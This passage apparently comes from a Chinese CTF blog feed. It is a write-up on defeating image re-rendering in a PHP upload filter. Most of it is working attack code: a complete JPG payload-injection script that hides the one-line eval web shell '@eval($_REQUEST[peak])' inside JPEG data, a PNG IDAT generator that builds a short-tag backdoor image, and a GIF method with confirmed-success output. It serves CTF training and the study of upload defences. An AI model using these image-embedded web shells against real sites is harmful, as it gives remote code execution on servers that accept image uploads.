imagecreatefrompng(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagepng(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = imagecreatefromgif(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagegif(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>提示:本pass重新渲染了图片！</p><p>如果上传之前的图片马，由于二次渲染里面的一句话会被清除</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628580605293-82134e58-fa29-49b0-8962-a36d452edfac.png" alt="img"></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>jpg_payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">2) Save the processed image and launch:</span><br><span class="hljs-comment">jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">See also:</span><br><span class="hljs-comment">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_REQUEST[peak]);?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>&#125;<br><br>set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br><span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br><span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br><span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br><span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br><span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br><span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br><span class="hljs-variable">$outStreamTmp</span> = <br>substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br><span class="hljs-variable">$miniPayload</span> . <br>str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br><span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br><span class="hljs-variable">$outStream</span> = <br>substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br><span class="hljs-variable">$miniPayload</span> . <br>substr(<br>str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br><span class="hljs-number">0</span>,<br><span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>&#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br><span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>unlink(<span class="hljs-variable">$filename</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br><span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br><span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br><span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为out.jpg.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;php jpg_payload.php out.jpg<br>Success!<br></code></pre></td></tr></table></figure><p>会生成payload_out.jpg(需要多尝试几张图片,有的图片会失败)</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628582531867-2367752f-aa38-4f74-9939-d54fcdf394a4.png" alt="img"></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>写入IDAT数据块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行后得到1.png.上传后下载到本地打开如下图16082.png</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628583498454-4275fbc5-c89c-444b-b801-3cf565b0ea31.png" alt="img"></p><p>注意生成后的后门使用的时短标签，服务器需要开启short_open_tag = On</p><p>利用成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628598955926-aa3e7c83-7f01-421c-a2ee-64c9ecf8f9d9.png" alt="img"></p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>二次渲染，最好制作的图片马就是.gif，比较渲染前后没有改变的部分，在没改变的这部分添加一句话</p><p>获得二次渲染gif代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$newgif</span> = imagecreatefromgif(<span class="hljs-string">&#x27;.\in.gif&#x27;</span>);          <br>imagegif(<span class="hljs-variable">$newgif</span>,<span class="hljs-string">&#x27;.\out.gif&#x27;</span>);                                    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对比in.gif和out.gif,比较渲染前后没有改变的部分，在没改变的这部分添加一句话</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628584898276-f10f2adf-d4ba-4dfe-becd-0104a902abf6.png" alt="img"></p><p>利用成功</p><p><a href="https://blog.csdn.net/qq_41617034/article/details/104936689"></a><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1628584795067-eb1e70ce-e411-422c-be5f-1098cb5790ce.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;二次渲染绕过&quot;&gt;&lt;a href=&quot;#二次渲染绕过&quot; class=&quot;headerlink&quot; title=&quot;二次渲染绕过&quot;&gt;&lt;/a&gt;二次渲染绕过&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="文件上传" scheme="https://swhat.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Docker-搭建题目环境</title>
    <link href="https://swhat.github.io/2021/06/29/Docker-%E6%90%AD%E5%BB%BA%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83/"/>
    <id>https://swhat.github.io/2021/06/29/Docker-%E6%90%AD%E5%BB%BA%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83/</id>
    <published>2021-06-29T14:26:42.000Z</published>
    <updated>2021-11-27T12:15:37.893Z</updated>
    
